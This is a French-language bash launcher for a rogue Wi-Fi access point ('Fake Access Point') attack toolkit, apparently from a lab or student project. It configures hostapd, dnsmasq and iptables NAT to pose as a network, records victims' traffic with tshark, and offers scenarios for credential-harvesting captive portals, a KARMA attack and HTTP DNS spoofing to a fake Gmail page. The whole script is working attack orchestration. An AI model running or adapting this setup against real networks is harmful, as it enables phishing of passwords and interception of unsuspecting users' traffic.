#! /usr/bin/env bash

# Reset
Color_Off='\033[0m'       # Text Reset

# Regular Colors
Bold='\033[1m'
Black='\033[1;30m'        # Black
Red='\033[1;31m'          # Red
Green='\033[1;32m'        # Green

banner(){
	echo -e '\0033\0143'
	echo -e "$Green $Bold ______    _                                         _____      _       _  "
	echo -e " |  ____|  | |            /\                         |  __ \    (_)     | |  "
	echo -e " | |__ __ _| | _____     /  \   ___ ___ ___ ___ ___  | |__) ___  _ _ __ | |_ "
	echo -e " |  __/ _  | |/ / _ \   / /\ \ / __/ __/ _ / __/ __| |  ___/ _ \| | '_ \| __|"
	echo -e " | | | (_| |   |  __/  / ____ | (_| (_|  __\__ \__ \ | |  | (_) | | | | | |_ "
	echo -e " |_|  \__,_|_|\_\___| /_/    \_\___\___\___|___|___/ |_|   \___/|_|_| |_|\__|$Color_Off"

	if [ ! -z ${1+x} ];then 
		echo -e "$Green-----------------------------------------------------------------------------$Color_Off"	

		echo -e "Votre Interface Wifi (celle qui est connecté a internet) est $Red $1 $Color_Off"
		echo -e "Votre Interface Alfa (celle du poit d'accès) est $Red $2 $Color_Off"	
	fi
	if [ ! -z ${fap_name+x} ];then 
		echo -e "Le nom de votre faux point d'accès wifi est $Red $fap_name $Color_Off"
	fi
	if [ ! -z ${choice+x} ];then 
		echo -e "Vous avez choisi le scénario : #$Red $choice $Color_Off"
		case $choice in 
			1)
				echo -e "\tOption : Faux point d'accès Wifi"
				;;
			2)
				echo -e "\tOption : Portail Captif"
				;;
			3)
				echo -e "\tOption : Attaque KARMA"
				;;
			4)
				echo -e "\tOption : DNS Spoofing (Uniquement HTTP)"
				;;
		esac
	fi
	if [ ! -z ${second_choice+x} ];then 
		case $second_choice in 
			1)
				echo -e "\tOption : Simple portail Captif"
				;;
			2)
				echo -e "\tOption : Portail Captif en refusant les premieres entrées"
				;;
			3)
				echo -e "\tOption : Portail Captif avec vérification sur le portail légitime"
				;;

			esac
	fi


	echo -e "$Green-----------------------------------------------------------------------------$Color_Off"	
}

    sudo ./stop.sh
    varr=0
    while getopts "r" arg; do
	case $arg in
	    r )
		varr=1
	    ;;
	esac
    done
    Int_Alfa=wlan1
    Int_Wifi=wlan0
    mac="00:c0:ca:b0:2d:26"
    sudo ./interface.sh $mac
    banner $Int_Wifi $Int_Alfa
    echo "[*] projet ready.."
    echo "Entrer le nom du Faux Point d'Acces"
    read fap_name
    export fap_name
    #on ecrit les informations dans les fichiers de configuration du projet
    #ssid
    sudo sed -i -r "s/^(ssid=).*/ssid=$fap_name/g" sc1/hostapd.conf
    sudo sed -i -r "s/^(ssid=).*/ssid=$fap_name/g" sc2/hostapd.conf
    sudo sed -i -r "s/^(ssid=).*/ssid=$fap_name/g" sc4/hostapd.conf
    #int_alfa hostapd
    sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc1/hostapd.conf
    sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc2/hostapd.conf
    sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc4/hostapd.conf

    #int_alfa dnsmasq
    sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc1/dnsmasq.conf
    sudo sed -i -r "s/^(interface=).*/interface=$Int_Alfa/g" sc4/dnsmasq.conf

    #int_alfa dhcp
    sudo sed -i -r "s/^(INTERFACESv4=).*/INTERFACESv4=\"$Int_Alfa\"/g" /etc/default/isc-dhcp-server

    #on met l'antenne alfa en mode monitor
    sudo ifconfig $Int_Alfa down 
    sudo iwconfig $Int_Alfa mode monitor
    sudo ifconfig $Int_Alfa up 

    #on configure l'antene en gw
    sudo ifconfig $Int_Alfa up 192.168.1.1 netmask 255.255.255.0
    sudo route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1

    #on laisse passer le trafic
    sudo iptables -F
    sudo iptables --table nat --append POSTROUTING --out-interface $Int_Wifi -j MASQUERADE 
    sudo iptables --append FORWARD --in-interface $Int_Alfa -j ACCEPT 
    sudo bash -c "echo 1 > /proc/sys/net/ipv4/ip_forward"

    sudo systemctl start ssh.service
    #banner $1 $2 
    echo "[*] choix du scenario"
    echo "*1 - Scénario de base : Point d'Acces Wifi + Enregistrement"
    echo "*2 - Scénario portail captif : scénario 1 + portail captif"
    echo "*3 - Scénario Attaque KARMA "
    echo "*4 - Scénario DNS Spoofing : scénario 1 + redirection sur des pages spécifique"

    read choice

    while [[ ! $choice =~ ^(1|2|3|4)$ ]]
    do
	    echo "1, 2, 3 ou 4"
	    read choice
    done

	if [[ $varr = 1 ]]; then
	    sudo sed -i -r "s/^(bool_exec=).*/bool_exec=1/g" restart.sh	
	    sudo sed -i -r "s/^(fap_name=).*/fap_name=$fap_name/g" restart.sh	
	    #sed -i -r "s/^(Int_Wf=).*/Int_Wf="$Int_Wifi"/g" restart.sh	
	    #sed -i -r "s/^(Int_Af=).*/Int_Af="$Int_Alfa"/g" restart.sh
	    #sed -i -r "s/mac="00:c0:ca:b0:2d:26"
	    case $choice in
		    2)
			    sudo sed -i -r "s/^(choice=).*/choice=$choice/g" restart.sh
			    #banner $Int_Wifi $Int_Alfa
			    echo "[*] choix du scenario 2"
			    echo "*2.1 - Portail Captif : Comportement normal"
			    echo "*2.2 - Portail Captif : Refus des 1ere entrées"
			    echo "*2.3 - Portail Captif : Vérification des entrées sur le portail captif légitime."

			    read second_choice
			    while [[ ! $second_choice =~ ^(1|2|3)$ ]]
			    do
				    echo "1, 2 ou 3"
				    read second_choice
			    done
			    sudo sed -i -r "s/^(second_choice=).*/second_choice=$second_choice/g" restart.sh	
			    if [[ $second_choice = 3 ]]; then
			    	banner $Int_Wifi $Int_Alfa
				    echo "merci de rentrer un nom d'utilisateur correct pour le portail captif"
				    read username
				    banner $Int_Wifi $Int_Alfa
				    echo "merci de rentrer le mot de passe de cet utilisateur"
				    read password
				    echo $username > /var/www/cred.txt
				    echo $password >> /var/www/cred.txt
			    fi
			    exit 0 
			    ;;
		    *)
			    sed -i -r "s/^(choice=).*/choice=$choice/g" restart.sh
			    exit 0 
			    ;;
	    esac     
    fi
    sudo sed -i -r "s/^(bool_exec=).*/bool_exec=0/g" restart.sh
    case $choice in 

	    1)
		    #banner $Int_Wifi $Int_Alfa
		    echo "[*] Starting"
		    echo "[*] Create AP"
		    sudo hostapd sc1/hostapd.conf -B 

		    echo "[*] Start DNS"
		    sudo dnsmasq -C sc1/dnsmasq.conf

		    echo "[*] start listening traffic"
		    sudo tshark -i $Int_Alfa -w saves_pcap/test.pcap

		    ;;

	    2) 
		    banner $Int_Wifi $Int_Alfa
		    echo "[*] choix du scenario 2"
		    echo "*2.1 - Portail Captif : Comportement normal"
		    echo "*2.2 - Portail Captif : Refus des 1ere entrées"
		    echo "*2.3 - Portail Captif : Vérification des entrées sur le portail captif légitime."

		    read second_choice
		    while [[ ! $second_choice =~ ^(1|2|3)$ ]]
		    do
			    echo "1, 2 ou 3"
			    read second_choice
		    done
		    echo "[*] Êtes-vous connecté en SSH? O/N"
		    read ssh_choice
		    while [[ ! $ssh_choice =~ ^(O|N)$ ]]
		    do
			    echo "O ou N"
			    read ssh_choice
		    done
		    
		    sudo sed -i -r "s/^(sudo tshark -i).*/\1 $Int_Alfa -w ..\/saves_pcap\/test.pcap -q \&/" sc2/go.sh
		    case $second_choice in
			    1)
				    banner $Int_Wifi $Int_Alfa
				    echo "[*] Starting"
				    sudo cp sc2/conf/000-default.conf /etc/apache2/sites-enabled/000-default.conf
				    sudo rm -r /var/www/html/*
				    sudo cp -r sc2/portail_captif_sc2.1/* /var/www/html/
				    sudo cp sc2/conf/.htaccess /var/www/html/
				    sudo chmod 666 /var/www/html/.htaccess
				    cd sc2/
				    sudo ./go.sh
				    if [ "$ssh_choice" == "N" ]
				    then
					    sudo gnome-terminal -- bash -c "./dnsserver.py;exec bash"
				    else
					    sudo python3 dnsserver.py &
				    fi
				    ;;

			    2)
				    banner $Int_Wifi $Int_Alfa
				    echo "[*] Starting"
				    #sudo gnome-terminal -- bash -c "./dnsserver.py;exec bash"
				    cp sc2/conf/000-default.conf /etc/apache2/sites-enabled/000-default.conf
				    sudo rm -r /var/www/html/*
				    cp -r sc2/portail_captif_sc2.2/* /var/www/html/
				    cp sc2/conf/.htaccess /var/www/html/
				    sudo chmod 666 /var/www/html/.htaccess
				    cd sc2/
				    sudo ./go.sh
				    if [ "$ssh_choice" == "N" ]
				    then
					    sudo gnome-terminal -- bash -c "./dnsserver.py;exec bash"
				    else
					    sudo python3 dnsserver.py &
				    fi
				    ;;
			    3)
				    banner $Int_Wifi $Int_Alfa
				    echo "merci de rentrer un nom d'utilisateur correct pour le portail captif"
				    read username
				    banner $Int_Wifi $Int_Alfa
				    echo "merci de rentrer le mot de passe de cet utilisateur"
				    read password
				    echo $username > /var/www/cred.txt
				    echo $password >> /var/www/cred.txt
				    echo "[*] Starting"
				    cp sc2/conf/000-default.conf /etc/apache2/sites-enabled/000-default.conf
				    sudo rm -r /var/www/html/*
				    cp -r sc2/portail_captif_sc2.3/* /var/www/html/
				    cp sc2/conf/.htaccess /var/www/html/
				    sudo chmod 666 /var/www/html/.htaccess
				    cd sc2/
				    sudo ./go.sh
				    if [ "$ssh_choice" == "N" ]
				    then
					    sudo gnome-terminal -- bash -c "./sc2/dnsserver.py;exec bash"
				    else
					    sudo python3 dnsserver.py &
				    fi
				    ;;
		    esac
		    ;;

	    3)
		    echo "en cours de dev sorry :/"
		    ;;
	    4)
		    banner $Int_Wifi $Int_Alfa
		    echo "[*] Starting"
		    sudo iptables -F
		    sudo iptables -A PREROUTING -t nat -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1
		    sudo iptables --table nat --append POSTROUTING --out-interface $Int_Wifi -j MASQUERADE
		    sudo iptables --append FORWARD --in-interface $Int_Alfa -j ACCEPT 
		    #droits aux fichiers
			echo "route ok"
		    sudo rm -r /var/www/html/*
		    sudo rm -f /var/www/html/.htaccess
		    sudo cp -r sc4/fgmail/* /var/www/html/
		    sudo cp sc4/conf/.htaccess /var/www/html/.htaccess
		    sudo chmod 646 /var/www/html/.htaccess
		    echo "[*] Create AP"
		    sudo hostapd sc4/hostapd.conf -B 

		    echo "[*] Start DNS"
		    sudo dnsmasq -C sc4/dnsmasq.conf

		    echo "[*] start listening traffic"
		    sudo tshark -i $Int_Alfa -w saves_pcap/test.pcap

		    ;;

	    * )
		    echo "$choice is not a valid option"
		    ;;
    esac

sleep 4
exit 0
